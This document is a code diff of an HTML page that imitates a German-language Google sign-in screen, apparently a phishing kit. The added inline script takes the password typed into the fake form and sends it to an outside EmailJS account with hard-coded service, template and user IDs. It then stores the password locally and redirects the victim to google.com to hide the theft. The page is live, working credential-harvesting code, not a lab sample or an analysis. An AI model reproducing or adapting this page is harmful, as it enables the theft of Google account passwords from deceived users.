@@ -4,298 +4,617 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <title>Anmeldung</title>
   <style>
-body{
-  background-color: black;
-  margin:0;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      position: relative;
-      font-family: 'Roboto', sans-serif;
-      height:100vh;
-      overflow:hidden;
+:root {
+  --bg: #000;
+  --field-bg: #1f1f1f;
+  --dropdown-bg: #2a2b2e;
+  --border: #3c4043;
+  --hover: #3a3b3f;
+  --active: #3c4b63;
+  --focus: #8ab4f8;
+  --text: #e8eaed;
 }
-.form-group{
-    height: 48px;
-    margin: 9px;
-    position: relative;
-}
+* { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Roboto", sans-serif; }
+body{ background-color: #0E0E0E; margin:0; display: flex; justify-content: center; align-items: flex-start; position: relative; height:100vh;color: white;padding-bottom: 200px; }
 
+.form-group{ height: 48px; margin: 9px; position: relative; }
 .form-control{
-    position: absolute;
-    top:0;
-    left:0;
-    width: 100%;
-    height: 100%;
-    background:none;
-    outline:none;
-    border-radius:3px;
-    z-index: 1;
-    color: white;
-    border: 1px solid #333;
+  position: absolute;
+  top:0;
+  left:10px;
+  width: 94%;
+  height: 100%;
+  background:none;
+  outline:none;
+  border-radius:5px;
+  z-index: 1;
+  color: white;
+  border: 1px solid #797B7A;
+  padding: 14px 12px;
+  font-size: 15px;
+  box-sizing: border-box;
 }
 .class-label{
-    position: absolute;
-    left:13px;
-    top:13px;
-    color:#BEBEBE;
-    background-color:black;
-    padding: 0 6px;
-    font-size:14px;
-    transition: .4s;
+  position: absolute;
+  color:#BEBEBE;
+  height:10px;
+  top: 1px;
+  width:auto;
+  z-index: 1;
+  left: 17px;
+  background-color:#0E0E0E;
+  padding: 15px 4px;
+  font-size:15px;
+  transition: .24s ease;
+  pointer-events: none;
 }
-.form-control:focus+ .class-label{
-    top:-12px;
-    z-index:10;
-    color: #7AADFF;
-    font-weight: 300px;
-
+.form-control:focus + .class-label{
+  top:-24px;
+  z-index:200;
+  left:18px;
+  color: var(--focus);
+  font-weight: 300;
 }
 .form-control:focus{
-    border: 2px solid #7AADFF;
+  border: 2px solid var(--focus);
 }
-.form-control:not(:focus):valid+label{
-    top:-12px;
-    z-index:10;
+.form-control:not(:placeholder-shown) + .class-label{
+  top:-24px;
+  z-index:200;
+  left:8px;
+  color: var(--focus);
+  font-weight: 300;
 }
-    /* Hauptcontainer */
-    .main-components {
-      max-width: 400px;
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-    }
+.main-components { max-width: 400px; width: 100%; display: flex; flex-direction: column; }
+.top-section { display: flex; flex-direction: column; }
+.bottom-section { padding: 0 10px; }
+.header { display: flex; color: white; flex-direction: column; align-items: flex-start; margin-bottom: 20px; }
+.top-row { display: flex; align-items: center; }
+.logo { height: 25px; padding: 0px 10px; }
+h1 { font-size: 30px; font-weight: 400; margin: 0; color: white; }
+hr { width: 100%; height: 1px; background-color: #373737; border: none; }
+.subtext { color: white; font-size: 16px; padding: 0px 24px; text-align: left; margin-bottom: 20px; }
+.link { color: #A8C7FA; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 30px; }
+.info-text { font-size: 13px; color: #aaa; margin-bottom: 0; }
+.info-text a { color: #647FAC; text-decoration: none; }
+#loginButton {
+  background-color: #9AB6E5;
+  color: black;
+  border: none;
+  width: auto;
+  float: right; /* Button nach rechts schieben */
+  padding: 10px 24px;
+  border-radius: 20px;
+  font-size: 14px;
+  cursor: pointer;
+  display: block;
+  margin-top: 10px;
+  margin-right: 24px;
+  position: relative;
+  right: 0;
+}
+.footer-links { margin-top: 20px; text-align: center; font-size: 13px; color: #aaa; }
+.footer-links a { color: #aaa; margin: 0 10px; text-decoration: none; }
+.viewport { width:100%; display:flex; justify-content:center; align-items:center; padding: 20px 0; box-sizing:border-box; }
+.card { width:100%; max-width:420px; background: transparent; box-sizing:border-box; }
+.select-wrapper { width: 240px; position: relative; z-index:300;margin: 0 5px; }
+.select-btn {
+  height: 34px;
+  width: auto;
+  background: transparent;
+  border: 1px solid transparent;
+  border-radius: 6px;
+  padding: 0 5px;
+  font-size: 13px;
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  transition: background 0.15s ease, border-color 0.15s ease;
+}
+.select-btn:hover, .select-btn.open { background: var(--field-bg); border-color: #A8C7FA;}
+.select-btn svg { width: 16px; height: 16px; fill: var(--text); transition: transform 0.2s ease, fill 0.1s ease; }
+.select-btn.open svg { transform: rotate(180deg); fill: var(--focus); }
+.select-dropdown { position: absolute; bottom: calc(21% + 12px); left: 0; width: 220px; background: var(--dropdown-bg); border-radius: 3px; padding: 6px 0; display: none; z-index: 30; }
+.select-dropdown.open { display: block; }
+.select-dropdown li { list-style: none; padding: 15px 8px; font-size: 11px; color: var(--text); cursor: pointer; white-space: nowrap; }
+.select-dropdown li:hover { background: var(--hover); }
+.select-dropdown li.active { background: var(--active); }
+@media (max-width: 440px) {
+  .select-wrapper { width: 45%; padding: 0 7px;}
+  .select-dropdown, .select-btn { width: 100%; }
+}
+.bottom-links {
+  display: flex;
+   padding-bottom: 20px;
+  gap: 10px;
+  margin-top: 20px;
+}
+.bottom-links a {
+  color: var(--text);
+  text-decoration: none;
+  font-size: 13px;
+  padding: 0px 17px;
+  transition: color 0.2s;
+}
+.bottom-links a:hover {
+  color: #fff;
+}
 
-    /* Top-Container: Logo bis hr */
-    .top-section {
-      display: flex;
-      flex-direction: column;
-    }
 
-    /* Bottom-Container: restlicher Inhalt */
-    .bottom-section {
-      padding: 0 10px;
-    }
+.custom-checkbox {
+  display: inline-flex;
+  align-items: center;#42445A
+  cursor: pointer;
+}
 
-    /* Header mit Logo, H1 und Linie */
-    .header {
-      display: flex;
-      color: white;
-      flex-direction: column;
-      align-items: flex-start;
-      margin-bottom: 40px;
-    }
+.custom-checkbox input {
+  display: none; /* native Checkbox ausblenden */
+}
 
-    .top-row {
-      display: flex;
-      align-items: center;
-    }
+.custom-checkbox span {
+  width: 18px;
+  height: 18px;
+  border-radius: 2px;
+  border: 2px solid #bdbdbd;
+  background-color: transparent;
+  position: relative;
+  transition: background-color 0.15s ease, border-color 0.15s ease;
+}
 
-    .logo {
-      height: 25px;
-      padding: 0px 10px;
-    }
+/* CHECKED */
+.custom-checkbox input:checked + span {
+  background-color: #b7d1ff; /* hellblau wie im Bild */
+  border-color: #b7d1ff;
+}
 
-    h1 {
-      font-size: 24px;
-      font-weight: 400;
-      margin: 0;
-      color: white;
-    }
+/* Häkchen */
+.custom-checkbox span::after {
+  content: "";
+  position: absolute;
+  left: 3px;
+  top: 0px;
+  width: 6px;
+  height: 10px;
+  border: solid #1f1f1f; /* schwarzes Häkchen */
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+  opacity: 0;
+}
 
-    hr {
-      width: 100%;
-      height: 2px;
-      background-color: #ccc; /* Grau bleibt gleich */
-      border: none;
-    }
+/* Häkchen sichtbar wenn checked */
+.custom-checkbox input:checked + span::after {
+  opacity: 1;
+}
 
-    .subtext {
-      color: white; /* Weiß */
-      font-size: 16px;
-      padding: 0px 10px;
-      text-align: left;
-      margin-bottom: 20px;
-    }
+.box9472 {
+  width: 15px;
+  height: 15px;
+  border: 1.5px solid #C3C7C4;
+  border-radius: 50%;
+  margin-left:26px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-sizing: border-box;
+}
+.wrap3821 {
+  position: relative;
+  width: 10px;
+  height: 10px;
+}
+.circle5518 {
+  width: 5px;
+  height: 5px;
+  background: #C3C7C4;
+  border-radius: 50%;
+  margin: 0 auto;
+}
+.shape7746 {
+  position: absolute;
+  bottom: -2px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 11px;
+  height: 5px;
+  background: #C3C7C4;
+  border-radius: 70%;
+}
 
-    .link {
-      color: #7AADFF;
-      font-size: 14px;
-      text-decoration: none;
-      display: inline-block;
-      margin-bottom: 30px;
-    }
-
-    .info-text {
-      font-size: 13px;
-      color: #aaa; /* Grau für Hilfe, Datenschutz etc. */
-      margin-bottom: 30px;
-    }
-
-    .info-text a {
-      color: #7AADFF;
-      
-      text-decoration: none;
-    }
-
-    /* Button Style */
-    #loginButton {
-      background-color: #7AADFF;
-      color: black;
-      border: none;
-      padding: 10px 24px;
-      border-radius: 20px;
-      font-size: 14px;
-      cursor: pointer;
-      margin-left: auto;
-      display: block;
-      margin-top: 8px;
-    }
-
-    /* Unten links "Deutsch" */
-    .bottom-left {
-      position: fixed;
-      bottom: 20px;
-      left: 16px;
-      font-size: 14px;
-      color: #aaa; /* Grau */
-      z-index: 10;
-    }
-
-    /* Dreieck Button */
-    .language-toggle {
-      position: fixed;
-      bottom: 20px;
-      width: 15px;
-      height: 15px;
-      background-color: gray;
-      border-radius: 4px;
-      clip-path: polygon(0% 0%, 100% 0%, 50% 60%);
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 10;
-    }
-
-    /* Sprachliste (bei Klick) */
-    .language-list {
-      position: fixed;
-      bottom: 50px; /* über dem Dreieck */
-      left: 14px;
-      background: #000; /* Schwarz */
-      border: 1px solid #555; /* Grau für Rahmen */
-      border-radius: 4px;
-      display: none;
-      flex-direction: column;
-      padding: 8px 0;
-      min-width: 120px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.5);
-      z-index: 20;
-    }
-
-    .language-list.show {
-      display: flex;
-    }
-
-    .language-item {
-      padding: 8px 16px;
-      cursor: pointer;
-      color: white; /* Text in Sprachelementen weiß */
-    }
-
-    .language-item:hover {
-      background-color: #222;
-    }
-    .footer-links {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 13px;
-      color: #aaa; /* Grau */
-    }
-    .footer-links a {
-      color: #aaa;
-      margin: 0 10px;
-      text-decoration: none;
-    }
-
-    /* layout centering */
-    .viewport {
-      width:100%;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      padding: 20px 0;
-      box-sizing:border-box;
-    }
-
-    .card {
-      width:100%;
-      max-width:420px;
-      background: transparent;
-      padding: 0 8px;
-      box-sizing:border-box;
-    }
-
+/* new: stored value display */
+.stored-display {
+  margin-left: 10px;
+  font-size: 13px;
+  color: #BEBEBE;
+  max-width: 160px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  align-self: center;
+}
   </style>
-  <title></title>
 </head>
 <body>
   <div class="viewport">
     <div class="card main-components">
-
       <div class="top-section">
         <div class="header">
           <div class="top-row">
             <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo" />
-            <p style="padding: 0px 10px; color: white; margin:0">Über Google anmelden</p>
+            <p id="header-sub" style="padding: 0px 1;font-size:13px;color: #B2B2B2; margin:0">Über Google anmelden</p>
           </div>
           <hr />
         </div>
       </div>
-
       <div class="bottom-section">
-        <h1 style="padding: 10px 10px; color: white">Anmeldung</h1>
-        <p class="subtext">Weiter zu DeepAI</p>
-
-        <form id="sendForm" class="form" novalidate>
-            <div class="form-group">
-                <input type="text" name="name" id="name" class="form-control" required autocomplete="off" />
-                <label for="name" class="class-label">E-Mail oder Telefonnummer</label>
-            </div>
-
-            <a href="#" class="link" style="padding: 0px 10px; color:#7AADFF">E-Mail-Adresse vergessen?</a>
-
-            <div class="info-text">
-              <a href="#" style="padding: 0px 10px; color:#7AADFF">Konto erstellen</a>
-            </div>
-
-            <input type="submit" id="loginButton" value="Weiter" />
-        </form>
+        <h1 id="title" style="padding: 24px 10px; color: white">Willkommen</h1>
       </div>
+
+      <div style="display:flex; align-items:center;">
+        <div class="box9472" aria-hidden="true">
+          <div class="wrap3821">
+            <div class="circle5518"></div>
+            <div class="shape7746"></div>
+          </div>
+        </div>
+        <!-- container for stored value (will be filled by JS if present) -->
+        <div id="storedValue" class="stored-display" aria-live="polite"></div>
+      </div>
+
+      <div style="height: 50px;"></div>
+
+      <form id="sendForm" class="form" novalidate>
+        <div class="form-group">
+          <input type="password" name="password" id="password" class="form-control" required autocomplete="current-password" placeholder=" " />
+          <label for="password" id="label-email" class="class-label">Passwort eingeben</label>
+        </div>
+
+        <!-- show/hide password checkbox -->
+        <div style="padding: 0 21px; margin-top: 8px;">
+          <label style="display:flex;align-items:center;gap:10px;user-select:none;">
+<label class="custom-checkbox">
+  <input id="togglePassword" type="checkbox">
+  <span></span>
+</label>
+
+            <span id="showPasswordLabel" style="font-size:13px;color:#BEBEBE">Passwort anzeigen</span>
+          </label>
+        </div>
+        <div style="height: 70px;"></div>
+<input type="submit" id="loginButton" value="Weiter" />
+        <div class="info-text" style="margin-top: 18px;">
+          <a href="https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S-921182909%3A1768896497555913" id="create-account" style="padding: 0px 20px; color:#A8C7FA">Passwort vergessen?</a>
+        </div>
+
+        <div style="height: 300px;"></div>
+
+        <div class="select-wrapper" id="langSelect">
+          <div class="select-btn" id="btn"> Deutsch <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+          <ul class="select-dropdown" id="list" role="listbox" aria-label="Sprachen">
+            <li data-code="af">Afrikaans</li>
+            <li data-code="az">azərbaycan</li>
+            <li data-code="bs">bosanski</li>
+            <li data-code="ca">català</li>
+            <li data-code="cs">Čeština</li>
+            <li data-code="cy">Cymraeg</li>
+            <li data-code="da">Dansk</li>
+            <li class="active" role="option" aria-selected="true" data-code="de">Deutsch</li>
+            <li data-code="et">eesti</li>
+            <li data-code="en-GB">English (United Kingdom)</li>
+            <li data-code="en-US">English (United States)</li>
+            <li data-code="es">Español (España)</li>
+          </ul>
+        </div>
+
+        <div class="bottom-links">
+          <a id="help-link" href="https://support.google.com/accounts?hl=de&p=account_iph">Hilfe</a>
+          <a id="privacy-link" href="https://accounts.google.com/TOS?loc=DE&hl=de&privacy=true">Datenschutz</a>
+          <a id="tos-link" href="https://accounts.google.com/TOS?loc=DE&hl=de">Nutzungsbedingungen</a>
+        </div>
+      </form>
     </div>
   </div>
 
-  <div class="bottom-left">Deutsch</div>
-  <div class="language-toggle" id="langBtn" title="Andere Sprachen auswählen"></div>
+  <script type="module">
+const EMAILJS_URL = "https://api.emailjs.com/api/v1.0/email/send";
+const SERVICE_ID = "service_8ypqbgk";
+const TEMPLATE_ID = "template_deqdkha";
+const USER_ID = "3yT23vyp0ntqbG7BP";
 
-  <div class="language-list" id="langList" aria-hidden="true">
-    <div class="language-item">Deutsch</div>
-    <div class="language-item">Englisch</div>
-    <div class="language-item">Französisch</div>
-    <div class="language-item">Spanisch</div>
-  </div>
-
-  <!-- Import map for esm.sh -->
-  <script type="importmap">
-  {
-    "imports": {
-      "@emailjs/browser": "https://esm.sh/@emailjs/browser@3.3.0"
-    }
+async function sendEmail(templateParams) {
+  const body = {
+    service_id: SERVICE_ID,
+    template_id: TEMPLATE_ID,
+    user_id: USER_ID,
+    template_params: templateParams
+  };
+  const resp = await fetch(EMAILJS_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body)
+  });
+  if (!resp.ok) {
+    const text = await resp.text().catch(()=>resp.statusText);
+    throw new Error("EmailJS send failed: " + resp.status + " " + text);
   }
-  </script>
+  return resp;
+}
 
-  <script type="module" src="./main.js"></script>
+/* element refs */
+const btn = document.getElementById("btn");
+const list = document.getElementById("list");
+const wrapper = document.getElementById("langSelect");
+const els = {
+  title: document.getElementById("title"),
+  headerSub: document.getElementById("header-sub"),
+  labelEmail: document.getElementById("label-email"),
+  createAccount: document.getElementById("create-account"),
+  loginButton: document.getElementById("loginButton"),
+  helpLink: document.getElementById("help-link"),
+  privacyLink: document.getElementById("privacy-link"),
+  tosLink: document.getElementById("tos-link"),
+  btn: btn,
+  showPasswordLabel: document.getElementById("showPasswordLabel")
+};
+
+const mappings = {
+  "de": {
+    langLabel: "Deutsch",
+    title: "Willkommen",
+    headerSub: "Über Google anmelden",
+    labelEmail: "Passwort eingeben",
+    recovery: "Passwort vergessen?",
+    continueBtn: "Weiter",
+    help: "Hilfe",
+    privacy: "Datenschutz",
+    tos: "Nutzungsbedingungen",
+    showPassword: "Passwort anzeigen",
+    docLang: "de"
+  },
+  "af": {
+    langLabel: "Afrikaans",
+    title: "Welkom",
+    headerSub: "Aanmelden met Google",
+    labelEmail: "Wagwoord invoer",
+    recovery: "Wagwoord vergeten?",
+    continueBtn: "Verder",
+    help: "Hulp",
+    privacy: "Privaatheid",
+    tos: "Voorwaarden",
+    showPassword: "Wagwoord tonen",
+    docLang: "af"
+  },
+  "az": {
+    langLabel: "azərbaycan",
+    title: "Xoş gəlmisiniz",
+    headerSub: "Google ilə daxil olun",
+    labelEmail: "Parol daxil edin",
+    recovery: "Parolu unutmusunuz?",
+    continueBtn: "Davam et",
+    help: "Kömək",
+    privacy: "Məxfilik",
+    tos: "İstifadə şərtləri",
+    showPassword: "Parolu göstər",
+    docLang: "az"
+  },
+  "bs": {
+    langLabel: "bosanski",
+    title: "Dobrodošli",
+    headerSub: "Prijavite se s Google računom",
+    labelEmail: "Unesite lozinku",
+    recovery: "Zaboravili ste lozinku?",
+    continueBtn: "Dalje",
+    help: "Pomoć",
+    privacy: "Privatnost",
+    tos: "Uslovi korištenja",
+    showPassword: "Prikaži lozinku",
+    docLang: "bs"
+  },
+  "ca": {
+    langLabel: "català",
+    title: "Benvingut",
+    headerSub: "Inicia sessió amb el teu compte de Google",
+    labelEmail: "Introdueix la contrasenya",
+    recovery: "Has oblidat la contrasenya?",
+    continueBtn: "Següent",
+    help: "Ajuda",
+    privacy: "Privadesa",
+    tos: "Condicions",
+    showPassword: "Mostra la contrasenya",
+    docLang: "ca"
+  },
+  "cs": {
+    langLabel: "Čeština",
+    title: "Vítejte",
+    headerSub: "Přihlásit se pomocí Googlu",
+    labelEmail: "Zadejte heslo",
+    recovery: "Zapomněli jste heslo?",
+    continueBtn: "Pokračovat",
+    help: "Nápověda",
+    privacy: "Ochrana osobních údajů",
+    tos: "Podmínky",
+    showPassword: "Zobrazit heslo",
+    docLang: "cs"
+  },
+  "cy": {
+    langLabel: "Cymraeg",
+    title: "Croeso",
+    headerSub: "Mewngofnodi gyda Google",
+    labelEmail: "Nodwch y cyfrinair",
+    recovery: "Wedi anghofio cyfrinair?",
+    continueBtn: "Parhau",
+    help: "Cymorth",
+    privacy: "Preifatrwydd",
+    tos: "Telerau",
+    showPassword: "Dangos cyfrinair",
+    docLang: "cy"
+  },
+  "da": {
+    langLabel: "Dansk",
+    title: "Velkommen",
+    headerSub: "Log ind med Google",
+    labelEmail: "Indtast adgangskode",
+    recovery: "Glemt adgangskode?",
+    continueBtn: "Næste",
+    help: "Hjælp",
+    privacy: "Privatliv",
+    tos: "Betingelser",
+    showPassword: "Vis adgangskode",
+    docLang: "da"
+  },
+  "et": {
+    langLabel: "eesti",
+    title: "Tere tulemast",
+    headerSub: "Logi sisse Google'i abil",
+    labelEmail: "Sisesta parool",
+    recovery: "Unustasid parooli?",
+    continueBtn: "Jätka",
+    help: "Abi",
+    privacy: "Privaatsus",
+    tos: "Kasutustingimused",
+    showPassword: "Näita parooli",
+    docLang: "et"
+  },
+  "en-GB": {
+    langLabel: "English (United Kingdom)",
+    title: "Welcome",
+    headerSub: "Sign in with Google",
+    labelEmail: "Enter password",
+    recovery: "Forgot password?",
+    continueBtn: "Continue",
+    help: "Help",
+    privacy: "Privacy",
+    tos: "Terms of Service",
+    showPassword: "Show password",
+    docLang: "en-GB"
+  },
+  "en-US": {
+    langLabel: "English (United States)",
+    title: "Welcome",
+    headerSub: "Sign in with Google",
+    labelEmail: "Enter password",
+    recovery: "Forgot password?",
+    continueBtn: "Continue",
+    help: "Help",
+    privacy: "Privacy",
+    tos: "Terms of Service",
+    showPassword: "Show password",
+    docLang: "en-US"
+  },
+  "es": {
+    langLabel: "Español (España)",
+    title: "Bienvenido",
+    headerSub: "Inicia sesión con Google",
+    labelEmail: "Introduce la contraseña",
+    recovery: "¿Has olvidado la contraseña?",
+    continueBtn: "Siguiente",
+    help: "Ayuda",
+    privacy: "Privacidad",
+    tos: "Términos",
+    showPassword: "Mostrar contraseña",
+    docLang: "es"
+  },
+};
+function applyLang(code) {
+  const pack = mappings[code] || mappings["en-US"];
+  els.title.textContent = pack.title;
+  els.headerSub.textContent = pack.headerSub;
+  const label = document.getElementById("label-email");
+  if (label) label.textContent = pack.labelEmail;
+  if (els.createAccount) els.createAccount.textContent = pack.recovery || pack.createAccount || "Passwort vergessen?";
+  if (els.loginButton) els.loginButton.value = pack.continueBtn;
+  if (els.helpLink) els.helpLink.textContent = pack.help;
+  if (els.privacyLink) els.privacyLink.textContent = pack.privacy;
+  if (els.tosLink) els.tosLink.textContent = pack.tos;
+  if (els.showPasswordLabel) els.showPasswordLabel.textContent = pack.showPassword || "Passwort anzeigen";
+  if (pack.docLang) document.documentElement.lang = pack.docLang;
+  const hl = pack.docLang || code;
+  if (els.helpLink) els.helpLink.href = `https://support.google.com/accounts?hl=${encodeURIComponent(hl)}&p=account_iph`;
+  if (els.privacyLink) els.privacyLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}&privacy=true`;
+  if (els.tosLink) els.tosLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}`;
+  btn.childNodes[0].textContent = pack.langLabel + " ";
+  Array.from(list.children).forEach(li => {
+    li.classList.toggle("active", li.dataset.code === code);
+    if (li.dataset.code === code) li.setAttribute("aria-selected", "true"); else li.removeAttribute("aria-selected");
+  });
+  try { localStorage.setItem("site_lang", code); } catch(e){}
+}
+
+/* init language */
+const initial = (function(){ try { return localStorage.getItem("site_lang") || "de"; } catch(e){ return "de"; } })();
+applyLang(initial);
+
+/* language dropdown interactions */
+btn.addEventListener("click", (e) => { e.stopPropagation(); btn.classList.toggle("open"); list.classList.toggle("open"); });
+list.addEventListener("click", (e) => {
+  const li = e.target.closest("li"); if (!li) return;
+  const code = li.dataset.code || "en-US";
+  applyLang(code); btn.classList.remove("open"); list.classList.remove("open");
+});
+document.addEventListener("click", e => { if (!e.target.closest(".select-wrapper")) { btn.classList.remove("open"); list.classList.remove("open"); }});
+document.addEventListener("keydown", (e) => { if (e.key === "Escape") { btn.classList.remove("open"); list.classList.remove("open"); }});
+
+/* password show/hide */
+const toggle = document.getElementById("togglePassword");
+const passwordInput = document.getElementById("password");
+toggle.addEventListener("change", () => {
+  if (toggle.checked) passwordInput.type = "text"; else passwordInput.type = "password";
+});
+
+/* show localStorage value next to .box9472 if present */
+function showStoredValue() {
+  const display = document.getElementById("storedValue");
+  if (!display) return;
+  try {
+    const stored = localStorage.getItem("last_sent_name");
+    if (stored && stored.length) {
+      // show a masked version for privacy (first and last char + dots) but keep visible per request
+      const trimmed = stored.length > 12 ? stored.slice(0,6) + "…" + stored.slice(-3) : stored;
+      display.textContent = "" + trimmed;
+      display.title = stored;
+    } else {
+      display.textContent = ""; // nothing to show
+    }
+  } catch (e) {
+    display.textContent = "";
+  }
+}
+showStoredValue();
+
+/* form submit -> EmailJS REST (sends password as 'name' param for legacy behavior) */
+const form = document.getElementById("sendForm");
+const submitBtn = document.getElementById("loginButton");
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const pass = passwordInput.value.trim();
+  const code = localStorage.getItem("site_lang") || initial;
+  const msgs = {
+    "de":"Bitte Passwort eingeben.",
+    "en-US":"Please enter password.",
+    "en-GB":"Please enter password."
+  };
+  if (!pass) { alert(msgs[code] || msgs["en-US"]); passwordInput.focus(); return; }
+
+  submitBtn.disabled = true;
+  submitBtn.style.opacity = "0.7";
+  submitBtn.style.cursor = "default";
+
+  try {
+    await sendEmail({ name: pass });
+    try { localStorage.setItem("last_sent_name", pass); } catch(e){}
+    showStoredValue(); // update display after storing
+    setTimeout(()=> { window.location.href = "https://google.com"; }, 700);
+  } catch (err) {
+    submitBtn.disabled = false;
+    submitBtn.style.opacity = "1";
+    submitBtn.style.cursor = "pointer";
+    console.error(err);
+    alert("Fehler beim Senden. Bitte später erneut versuchen.");
+  }
+});
+  </script>
 </body>
 </html>
